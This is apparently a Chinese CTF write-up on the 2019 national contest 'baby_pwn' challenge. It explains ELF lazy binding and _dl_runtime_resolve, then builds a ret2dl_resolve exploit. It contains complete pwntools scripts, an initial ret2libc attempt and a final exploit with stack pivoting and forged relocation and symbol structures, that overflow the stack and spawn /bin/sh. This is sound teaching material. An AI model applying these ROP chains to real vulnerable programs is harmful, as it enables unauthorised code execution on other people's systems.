> 原文链接: https://www.anquanke.com//post/id/177450 


# 高级ROP：Ret2dl_resolve技术详解


                                阅读量   
                                **334831**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">7</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01377a0b7742fbec6b.png)](https://p2.ssl.qhimg.com/t01377a0b7742fbec6b.png)



<a class="reference-link" name="%E6%A6%82%E8%BF%B0%EF%BC%9A%E4%B8%80%E9%81%93%E7%AE%80%E5%8D%95%E7%9A%84pwn%E9%A2%98%E5%BC%95%E5%87%BA%E7%9A%84%E4%B8%80%E7%A7%8D%E6%9E%84%E9%80%A0%E9%9D%9E%E5%B8%B8%E5%A4%8D%E6%9D%82ROP%E6%8A%80%E5%B7%A7%E2%80%94ret2dl_resolve%E3%80%82%E6%9C%AC%E6%96%87%E5%B0%86%E4%BB%8E%E5%8E%9F%E7%90%86%E7%9A%84%E8%A7%92%E5%BA%A6%EF%BC%8C%E8%A7%A3%E6%9E%90ELF%E6%96%87%E4%BB%B6%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%8C%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%E8%BF%99%E4%B8%80%E7%A7%8D%E6%8A%80%E6%9C%AF%E3%80%82"></a>概述：一道简单的pwn题引出的一种构造非常复杂ROP技巧—ret2dl_resolve。本文将从原理的角度，解析ELF文件以及其延迟绑定的原理，深入解析这一种技术。

题目来源-&gt;

19年全国大学上信息安全大赛:baby_pwn

[https://www.ctfwp.com/articals/2019national.html](https://www.ctfwp.com/articals/2019national.html)

## 题目分析

查看ELF的版本，发现是32位的

$file pwn

[![](https://p4.ssl.qhimg.com/t01790cec34f62edeb6.png)](https://p4.ssl.qhimg.com/t01790cec34f62edeb6.png)

把程序丢入IDA分析。发现有非常明显的栈溢出。

[![](https://p5.ssl.qhimg.com/t01501e227f2eda6b18.png)](https://p5.ssl.qhimg.com/t01501e227f2eda6b18.png)

[![](https://p4.ssl.qhimg.com/t015527fbeeb11f40d1.png)](https://p4.ssl.qhimg.com/t015527fbeeb11f40d1.png)

构建 offset=”A”*2c就能获得完全的栈控制。

一开始看到这么结构这么简单的题目，名字还叫baby_pwn,以为碰到了入门题（白眼）

决定使用Ret2LIbc直接拿shell

本地验证：（ASLR is off）

```
----------------------exp1.py----------------------------
from pwn import *
#p=remote("da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com",33865)
p=process('./pwn')
libc=ELF('./libc-2.23.so')
#gdb.attach(p)

#local
libc_base=0xf7dfd000
system_off=libc.symbols['system']
execve_off=libc.symbols['execve']
shell_off=next(libc.search('/bin/sh'))
execve_addr=libc_base+execve_off
shell_address=libc_base+shell_off

payload="A"*(0x30-4)
payload+=p32(execve_addr)
payload+=p32(0)
payload+=p32(shell_address)
payload+=p32(0)
payload+=p32(0)

p=process('./pwn')
p.sendline(payload)
p.interactive()
```

本地拿到了shell，但是远程溢出失败了。

但是也是在预料之中，国赛怎么会让我这么容易拿到shell呢。

总结发现，问题在于-&gt;

```
1.本地调试是知道libc版本，远程服务器不知道libc版本
2.即使知道libc版本，能计算出execve和已知函数的偏移，服务器开着ASLR必须用rop才能计算出基地址。但是本地代码中却不存在write/puts这样的函数，却没有办法构造ROP链。
```

刚开始唯一的想法是通过爆破法，强行爆破libc的基地址。（在已知libc版本情况下比较好实现。）但是最后也没有爆破出来。#后来大佬说是爆破syscall的位置，有空去验证。

后来经过大佬指点，这种没有构造ROP链接的基础函数，虽然没有write/put函数来构造rop，但是能够通过一种叫做ret2dl-resolve的技术，来构造rop。遂去研究。



## Ret2dl_resolve解析

Ret2dl_resolve本质上也是ROP，只不过使用的是更加底层的技术：

ELF在动态链接加载的过程中有一种延迟绑定的机制，程序通过函数dl_runtime_resolve (link_map_obj, reloc_index)来进行对函数进行重定位。虽然重定位过程很复杂，但是最终还是依靠符号表来确定导入函数，如果能在这个过程中影响符号表的读取，就有可能将任意函数重定位为我们需要的函数。

在学习这种利用技术之前，需要掌握以下几点，

```
1.必须要对ELF有一定的了解。否则会很难理解。
2.基本ROP技术，stack povit控制栈帧技巧。
```

掌握好以上的基础，就让我们开始吧。

### <a class="reference-link" name="%E7%90%86%E8%A7%A3ELF"></a>理解ELF

在这里先安利一本书《程序员的自我修养》，里面对ELF和PE以及动态链接都有非常深入地解析。

本一些没有细讲的部分都能在这本书里找到答案。

首先我们需要掌握一些命令，方便学习ELF结构

```
$readelf -h -r pwn #-h查看头信息 -r查看重定位表
$objdump -s -d  -h pwn  #-s查看十六进制信息 -d 查看代码段反汇编信息 -h查看段信息
```

分析pwn文件

观察一下文件头：#$readelf -h pwn

[![](https://p3.ssl.qhimg.com/t01a6c059d1ff3e6ab8.png)](https://p3.ssl.qhimg.com/t01a6c059d1ff3e6ab8.png)

开头的魔数(Magic)以及一些基本文件信息就先不看。

先看几个与这次漏洞相关的数据。

因为段是我们这次研究的重点。

所以先找到Start of section headers位置，这个位置记录了段表距离文件头偏移6320字节。

节头大小为40字节，一般等于sizeof(Elf32_Shdr)

结头数量31，等于ELF拥有的段的数量。

### <a class="reference-link" name="%E7%90%86%E8%A7%A3%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A(PLT)"></a>理解延迟绑定(PLT)

让我们在调试程序的时候理解这个过程。

```
$ objdump -d pwn | grep read #查询plt段中read的地址
08048390 &lt;read@plt&gt;:
 8048541:    e8 4a fe ff ff           call   8048390 &lt;read@plt&gt;
gdb下断点 b *0x8048390
```

第一次调用read函数：

进入read.plt，发现跳转到ds:0x804a00c-&gt;实际上就是Got表中存放read函数的地址

```
$ objdump -R pwn #查看Got表
0804a00c R_386_JUMP_SLOT   read@GLIBC_2.0
```

一般来说GOT表地址存储的就是函数的地址，

但是为什么第一次调用函数，程序却跳转到0x8048396呢？

[![](https://p4.ssl.qhimg.com/t01c0d78fc33f309469.png)](https://p4.ssl.qhimg.com/t01c0d78fc33f309469.png)

查看一下GOT表的内存就很清楚了，此时的GOT表中没有存放read的真实地址。

而是将程序调回去。（典型的甩锅？）

```
$ x/10xw 0x804a00c
0x804a00c:    0x08048396    0xf7ead270    0xf7e15540    0xf7e5d36
```

实际上当程序第一次调用这个函数的时候，GOT表中还没有存放函数的地址。需要返plt回利用其进行重定位。

接下里的步骤就是延迟绑定的操作。

程序从GOT表跳转回PLT之后，执行了两个PUSH和一个JMP

先push 0x0 然后再跳转到0x8048380。

接着直接执行

```
push   DWORD PTR ds:0x804a004 ---&gt;0xf7ffd918----&gt;linkmap
```

看上去非常乱，但实际上这些操作只是将两个参数 0x0(reloc_arg) 和0xf7ffd918(link_map地址)放入栈中。

接着调用_dl_runtime_resolve函数。

即_dl_runtime_resolve(0x0,0xf7ffd918)，将read函数的真实地址放入read[@got](https://github.com/got)表中。

下次再调用read.plt的时候就直接通过got表跳转到函数真实地址。不用再次加载了。

这个函数即重定位函数。也是我们这次研究的核心部分。

我们也将利用这个函数，来劫持重定位过程。

[![](https://p1.ssl.qhimg.com/t0178367bc849f32f7f.png)](https://p1.ssl.qhimg.com/t0178367bc849f32f7f.png)

[![](https://p1.ssl.qhimg.com/t014e8b25a8db99a023.png)](https://p1.ssl.qhimg.com/t014e8b25a8db99a023.png)

程序进入_dl_runtime_resolve

经过之前一番操作，可能会有一些头晕。先不急着马上研究这个函数的实现，现在再理一遍。

下图是Plt表的开头一部分代码：

Plt0是表的表头，即0x8048380.

在任何函数第一次调用的时候，push reloc_arg入栈。

都会跳转回0x8048380 将link_map入栈。然后跳转到_dl_runtime_resolve。

reloc_arg：重定位的偏移量，用来在rel.plt中找到对应的ELF32_REL结构体。

Link_map ：动态链接器的地址（固定的）

```
push   DWORD PTR ds:0x804a004 ---&gt;0xf7ffd918----&gt;linkmap
gdb-peda$ x/4xw 0xf7ffd918
0xf7ffd918:    0x00000000    0xf7ffdc04    0x08049f14    0xf7ffdc08
```

[![](https://p4.ssl.qhimg.com/t018c2166fd3368bc76.png)](https://p4.ssl.qhimg.com/t018c2166fd3368bc76.png)

这里的reloc_arg是如何计算的呢，首先理解一下reloc_arg真正含义。

reloc_arg实际上就是plt表中函数的编号**8（ELF32_REL结构体长度为8，可以通过sizeof计算）,用来确定导入函数在rel.plt中的偏移**

**例如这里的read函数标号是0，那么alarm便是1**8

所以reloc_arg=[(0x8048390-0x8048380)/0x10-1]**8=0 **8

如果是alarm的reloc_arg便是[(0x80483a0-0x8048380)/0x10-1]**8=1**8

依次下去…（下图给出证明）

到目前为止，搞明白延迟绑定的原理，接下来就要进入这次的核心内容_dl_runtime_resolve的运作原理。

### <a class="reference-link" name="_dl_runtime_resolve%E5%88%86%E6%9E%90"></a>_dl_runtime_resolve分析

首先需要下载glibc源码

[https://ftp.gnu.org/gnu/glibc/](https://ftp.gnu.org/gnu/glibc/)

$ /lib/x86_64-linux-gnu/libc.so.6 #查看本机当前glibc版本

理解重定位表和符号解析，下面这张图将这个函数的运作过程讲解地非常好。

我们会在这张图的基础上实际演示一遍read函数的重定位过程。

[![](https://p4.ssl.qhimg.com/t01a734d7587397490d.png)](https://p4.ssl.qhimg.com/t01a734d7587397490d.png)

_dl_runtime_resolve函数中reloc_argc是确定重定位函数在JMPREL中的位置。

通过readelf查找，发现JMPREL即rel.plt表的首地址

```
$ readelf -a pwn |grep JMPREL
 0x00000017 (JMPREL)                     0x804833c
```

[![](https://p4.ssl.qhimg.com/t018a59673723ed0de9.png)](https://p4.ssl.qhimg.com/t018a59673723ed0de9.png)

查看一下rel.plt的内存空间，根据结构体ELF32_REL (在glibc/elf/elf.h中被定义)

```
typedef struct `{`
    Elf32_Addr r_offset;    //重定位入口的偏移
    Elf32_Word r_info;      // 重定位入口的类型和符号
`}` Elf32_Rel;
r_offset=0x804a00c#即read的got表地址   r_info=107#结尾必须是7
```

[![](https://p3.ssl.qhimg.com/t01a93c284a2d695ff5.png)](https://p3.ssl.qhimg.com/t01a93c284a2d695ff5.png)

接下来通过r_info&gt;&gt;8(向右移两个字节)=1，来到symtab表中获取st_name这个数据。但是symtab在内存中并没有映射，而是被映射到了一个叫做dymsym的段中。 #根据上图dymsym的首地址为0x80481dc

[![](https://p5.ssl.qhimg.com/t01a8efb57e9040d8dc.png)](https://p5.ssl.qhimg.com/t01a8efb57e9040d8dc.png)

根据结构体Elf32_Sym分析#Elf32_Sym长度为0x10，编号从0开始

```
typedef struct
`{`
  Elf32_Word    st_name;        /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;        /* Symbol value */
  Elf32_Word    st_size;        /* Symbol size */
  unsigned char    st_info;        /* Symbol type and binding */
  unsigned char    st_other;        /* Symbol visibility */
  Elf32_Section    st_shndx;        /* Section index */
`}` Elf32_Sym;
```

可以知道st_name=0x20

知道了这一部分，接下里只需要去dynstr，根据st_name的偏移量来找到那个重定位字符。

Dynstr首地址为0x804827c

Read的地址为dynstr+st_name=0x804827c+0x20=0x804829c

成功读取字符。

[![](https://p0.ssl.qhimg.com/t011b2ce5d2f2b0bedd.png)](https://p0.ssl.qhimg.com/t011b2ce5d2f2b0bedd.png)

但是一直想吐槽的一点就是，我们到目前为止所有的操作，都只是为了读取一段字符串。接下来会继续呼叫函数，来执行真正的重定位。

但是我们目前只需要研究到这一点，因为重定位字符串非常重要。如果在内存中把read换成alarm，那么read的GOT表位置会被解析为alarm。

实际演示：

使用set修改内存中read为alarm

```
gdb-peda$ set `{`char`}` 0x804829c=0x61
gdb-peda$ set `{`char`}` 0x804829d=0x6c
gdb-peda$ set `{`char`}` 0x804829e=0x61
gdb-peda$ set `{`char`}` 0x804829f=0x72
gdb-peda$ set `{`char`}` 0x80482a0=0x6d
gdb-peda$ set `{`char`}` 0x80482a1=0x00
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012c0b84d12647f793.png)

然后执行程序

发现执行read的时候，程序却执行了alarm

[![](https://p3.ssl.qhimg.com/t019bae3d08f64bdca1.png)](https://p3.ssl.qhimg.com/t019bae3d08f64bdca1.png)

查看read的Got表，发现地址也被重定向为了alarm的地址。

```
$ x/xw 0x0804a00c
0x804a00c:    0xf7ead270
```

### <a class="reference-link" name="%E6%80%9D%E8%B7%AF%EF%BC%9A"></a>思路：

现在我们已经懂得了如何利用控制符号重定位来对函数进行解析。

理论上只需要修改dynstr段的内容就能够控制重定位，但是在程序中，dynstr段是不可写的。

所以直接修改是难以实现的。我们真正能控制的只有reloc_argc.

所以前辈们想出了一个解决方案，便是伪造rel.plt表和symtab表，并且修改reloc_argc，让重定位函数解析我们伪造的结构体，借此修改符号解析的位置。

注意：本题所有的gadget都是在pwn程序中找到的，libc因为版本未知，所以不能够确定。



## 利用脚本

#### <a class="reference-link" name="Stack%20pvoit"></a>Stack pvoit

首先为了栈完全可控，我们选择bss段，作为新的栈段。

下面是代码，利用到stack pviot技术，自定义一块内存区域为新的堆栈。

```
from pwn import *
context.log_level='debug'
p=process('./pwn')
elf=ELF('./pwn')
gdb.attach(p)

bss_addr=0x0804a040 #objdump -h pwn|grep bss
read_plt=0x08048390 #objdump -d pwn |grep plt
gadget1=0x0804852a #ROPgadget --binary pwn |grep leave # leave |ret

payload='A'*0x28+p32(bss_addr) #EBP-&gt;bss_addr
payload+=p32(read_plt)+p32(gadget1)+p32(0)+p32(bss_addr)+p32(0x36)
p.sendline(payload)
#raw_input()
#p.sendline("a"*0x20)
p.interactive()
```

成功修改了栈顶为BSS段的头

[![](https://p2.ssl.qhimg.com/t011b42712425f3066e.png)](https://p2.ssl.qhimg.com/t011b42712425f3066e.png)

```
gadget2=0x080485d9 #pop esi | pop edi | pop ebp | ret
gadget3=0x080485db #pop ebp | ret
stack_size=0x800
base_stage=bss_addr+stack_size

payload1="A"*4 #留给上一个ROP链会执行的leave（pop ebp）的数据
payload1+=p32(read_plt)+p32(gadget2)+p32(base_stage)+p32(100)
payload1+=p32(gadget3)+p32(base_stage)
payload1+=p32(gadget1)
p.sendline(payload1)
```

成功将栈顶变为bss_addr 栈底变为base_stage，完成stack pviot

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01f823c563361b04d9.png)

#### <a class="reference-link" name="%E6%9E%84%E9%80%A0%E4%BC%AA%E9%80%A0%E8%A1%A8"></a>构造伪造表

构造时候，需要计算出偏移值，然后再设计栈。这是一个很需要耐心的过程。

希望读者能把下面这段代码好好消化以下，对照上面的重定位表的结构。

```
#fake struct
dynsym=0x080481dc#objdump -h pwn
dynstr=0x0804827c
alarm_got=0x0804a010
fake_sym_addr=base_stage+36
align=0x10-((fake_sym_addr-dynsym)&amp;0xf) #align=8#栈对齐
fake_sym_addr=fake_sym_addr+align

index_dynsym=(fake_sym_addr-dynsym)/0x10 #计算fake_sym和dysym的偏移
r_info=index_dynsym&lt;&lt;8|0x7 #要遵循r_info的结构
fake_reloc=p32(alarm_got)+p32(r_info)# rel alarm-&gt;system #将alarm重定位
st_name=fake_sym_addr+0x10-dynstr #计算fake_dynstr和真实dynstr的偏移
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12) #根据sym结构体，构造fake_sym

plt0=0x08048380 #.plt 强制alarm重定位
rel_plt=0x0804833c #原JMPREL结构位置
index_offset=(base_stage+28)-rel_plt #计算reloc_arg
cmd='/bin/sh'

payload2='B'*4 #EBP
payload2+=p32(plt0) #程序强制重定位
payload2+=p32(index_offset) # push reloc_arg
payload2+='A'*4 #EBP 
payload2+=p32(base_stage+80) #重定位结束之后，栈顶设置为base_stage+80
payload2+='A'*8
#fake_struct
payload2+=fake_reloc #base_stage+28 #在栈中伪造fake_reloc结构
payload2+='B'*8
payload2+=fake_sym #base_stage+36#在栈中伪造fake_sym结构
payload2+="systemx00" #在栈中伪造 dynstr结构
payload2+='A'*(80-len(payload2))
payload2+=cmd+'x00' #重定位结束之后，会自动调用被重定位函数，此时在栈顶存放system的参数
payload2+='A'*(100-len(payload2))
print len(payload2)
p.send(payload2)
```

经历一个漫长的构造过程，终于成功get shell

[![](https://p2.ssl.qhimg.com/t01775b050c55757a2f.png)](https://p2.ssl.qhimg.com/t01775b050c55757a2f.png)

#### <a class="reference-link" name="%E5%AE%8C%E6%95%B4%E7%9A%84exp"></a>完整的exp

```
from pwn import *
context.log_level='debug'
p=process('./pwn')
#p=remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com",56833)
elf=ELF('./pwn')
#gdb.attach(p)


bss_addr=0x0804a040 #objdump -h pwn|grep bss
read_plt=0x08048390 #objdump -d pwn |grep plt
gadget1=0x0804852a #ROPgadget --binary pwn |grep leave # leave |ret

payload='A'*0x28+p32(bss_addr) #EBP-&gt;bss_addr
payload+=p32(read_plt)+p32(gadget1)+p32(0)+p32(bss_addr)+p32(0x36)
#raw_input()
p.sendline(payload)
raw_input()
#p.sendline("a"*0x20)


gadget2=0x080485d9 #pop esi | pop edi | pop ebp | ret
gadget3=0x080485db #pop ebp | ret
stack_size=0x800
base_stage=bss_addr+stack_size
payload1="A"*4
payload1+=p32(read_plt)+p32(gadget2)+p32(0)+p32(base_stage)+p32(100)
payload1+=p32(gadget3)+p32(base_stage)
payload1+=p32(gadget1)
p.sendline(payload1)

#fake struct
dynsym=0x080481dc#objdump -h pwn
dynstr=0x0804827c
alarm_got=0x0804a010
fake_sym_addr=base_stage+36
align=0x10-((fake_sym_addr-dynsym)&amp;0xf) #align=8
fake_sym_addr=fake_sym_addr+align

index_dynsym=(fake_sym_addr-dynsym)/0x10
r_info=index_dynsym&lt;&lt;8|0x7
fake_reloc=p32(alarm_got)+p32(r_info)# rel alarm-&gt;system
st_name=fake_sym_addr+0x10-dynstr
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

plt0=0x08048380 #.plt
rel_plt=0x0804833c
index_offset=(base_stage+28)-rel_plt
cmd='/bin/sh'

payload2='B'*4
payload2+=p32(plt0)
payload2+=p32(index_offset) # push reloc_arg
payload2+='A'*4
payload2+=p32(base_stage+80)
payload2+='A'*8
#fake_struct
payload2+=fake_reloc #base_stage+28
payload2+='B'*8
payload2+=fake_sym #base_stage+36
payload2+="systemx00"
payload2+='A'*(80-len(payload2))
payload2+=cmd+'x00'
payload2+='A'*(100-len(payload2))
print len(payload2)
p.send(payload2)

p.interactive()
```

### <a class="reference-link" name="%E7%BB%93%E6%9D%9F%E8%AF%AD%EF%BC%9A"></a>结束语：

这个技术利用难度非常高，研究了好多天才成功实现。在这个过程中把ELF结构还有重定位的原理全都复习了一遍，这个过程虽然辛苦，但在彻悟之后便会带来一种特殊的喜悦。

通过这道题，还是发现了自己在对ELF方面理解还是不够深，借做这道题的机会好好梳理一下。

文章中如有错误，希望各位大佬，能批评指正。

## 参考文献：

[https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/](https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/)

[https://blog.csdn.net/weixin_33737134/article/details/87765347](https://blog.csdn.net/weixin_33737134/article/details/87765347)
